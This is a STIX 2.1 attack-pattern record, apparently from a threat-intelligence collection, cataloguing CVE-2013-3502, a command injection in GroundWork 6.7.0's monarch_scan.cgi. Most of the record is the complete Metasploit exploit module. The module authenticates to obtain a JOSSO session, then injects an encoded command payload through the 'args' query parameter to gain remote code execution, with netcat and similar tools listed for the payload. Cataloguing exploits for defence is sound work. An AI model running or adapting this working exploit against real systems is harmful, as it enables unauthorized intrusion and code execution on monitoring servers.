{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--01cebcf4-59f3-4462-a1df-a92c12b419d9",
    "created": "2024-08-14T17:00:27.990882Z",
    "modified": "2024-08-14T17:00:27.990887Z",
    "name": "\"GroundWork monarch_scan.cgi OS Command Injection\"",
    "description": " This module exploits a vulnerability found in GroundWork 6.7.0. This software is used for network, application and cloud monitoring. The vulnerability exists in the monarch_scan.cgi where user controlled input is used in the perl qx function. This allows any remote authenticated attacker, regardless of privileges, to inject system commands and gain arbitrary code execution. The module has been tested successfully on GroundWork 6.7.0-br287-gw1571 as distributed within the Ubuntu 10.04 based VM appliance.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/groundwork_monarch_cmd_exec.rb",
            "external_id": "groundwork_monarch_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3502"
        },
        {
            "source_name": "reference",
            "url": "https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130308-0_GroundWork_Monitoring_Multiple_critical_vulnerabilities_wo_poc_v10.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote\\/1\\.1/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"GroundWork monarch_scan.cgi OS Command Injection\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in GroundWork 6.7.0. This software\n        is used for network, application and cloud monitoring. The vulnerability exists in\n        the monarch_scan.cgi where user controlled input is used in the perl qx function.\n        This allows any remote authenticated attacker, regardless of privileges, to\n        inject system commands and gain arbitrary code execution. The module has been tested\n        successfully on GroundWork 6.7.0-br287-gw1571 as distributed within the Ubuntu 10.04\n        based VM appliance.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Johannes Greil', # Vulnerability Discovery, PoC\n          'juan vazquez'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-3502' ],\n          [ 'OSVDB', '91051' ],\n          [ 'US-CERT-VU', '345260' ],\n          [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130308-0_GroundWork_Monitoring_Multiple_critical_vulnerabilities_wo_poc_v10.txt' ]\n        ],\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 8190,\n          'DisableNops' => true,\n          'Compat'          =>\n            {\n              'PayloadType' => 'cmd',\n              # Based on the default Ubuntu 10.04 VM appliance\n              'RequiredCmd' => 'generic telnet netcat perl python'\n            },\n        },\n      'Platform'       => %w{ linux unix },\n      'Targets'        =>\n        [\n          ['GroundWork 6.7.0', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-03-08',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('USERNAME',  [true, 'GroundWork Username', 'user']),\n          OptString.new('PASSWORD',  [true, 'GroundWork Password', 'user'])\n        ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(\"josso\", \"signon\", \"login.do\")\n    })\n\n    if res and res.body =~ /GroundWork.*6\\.7\\.0/\n      return Exploit::CheckCode::Appears\n    elsif res and res.body =~ /GroundWork/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def get_josso_token\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(\"josso\", \"signon\", \"usernamePasswordLogin.do\"),\n      'vars_post' => {\n        'josso_cmd'      => 'login',\n        'josso_username' => datastore['USERNAME'],\n        'josso_password' => datastore['PASSWORD']\n      }\n    })\n    if res and res.get_cookies =~ /JOSSO_SESSIONID_josso=([A-F0-9]+)/\n      return $1\n    else\n      return nil\n    end\n  end\n\n  def execute_command(command)\n    http_handler = ((datastore['SSL']) ? \"https\" : \"http\")\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(\"monarch\", \"monarch_scan.cgi\"),\n      'headers'   =>\n        {\n          'Referer' => \"#{http_handler}://#{rhost}/portal/auth/portal/groundwork-monitor/auto-disc\"\n        },\n      'cookie'    => \"JOSSO_SESSIONID=#{@josso_id}\",\n      'query'     => \"args=#{rand_text_alpha(3)}&args=#{rand_text_alpha(3)}&args=#{Rex::Text.uri_encode(command + \";\")}\"\n    })\n    return res\n  end\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n\n    print_status(\"Attempting to login...\")\n    @josso_id = get_josso_token\n    if @josso_id.nil?\n      fail_with(Failure::NoAccess, \"#{peer} - Unable to retrieve a JOSSO session ID\")\n    end\n    print_good(\"Authentication successful\")\n\n    print_status(\"Sending malicious request...\")\n    execute_command(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-08",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}